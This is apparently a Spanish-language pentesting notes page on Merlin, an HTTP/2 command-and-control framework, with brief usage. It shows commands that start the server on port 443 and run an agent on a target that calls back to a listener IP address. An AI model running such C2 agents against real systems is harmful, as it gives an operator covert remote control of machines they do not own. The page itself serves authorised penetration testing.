### **Post-Explotación/Frameworks/Merlin.md**

# Merlin

## Descripción

**Merlin** es una herramienta de comando y control (C2) multiplataforma que utiliza HTTP/2 para comunicaciones, ofreciendo un canal cifrado y eficiente. Es utilizado en pruebas de penetración para gestionar agentes en sistemas comprometidos.

## Uso

Iniciar el servidor Merlin y desplegar agentes en los sistemas objetivo.

### Opciones principales

- **Servidor**:

  ```bash
  ./merlinServer
  ```

- **Agente**:

  Generar y ejecutar el binario del agente en el sistema objetivo.

## Ejemplos

- Iniciar el servidor:

  ```bash
  ./merlinServer -port 443
  ```

- Generar un agente para Windows:

  ```bash
  ./merlinAgent.exe -url https://192.168.1.100:443
  ```

- Ejecutar comandos y tareas desde la consola del servidor.

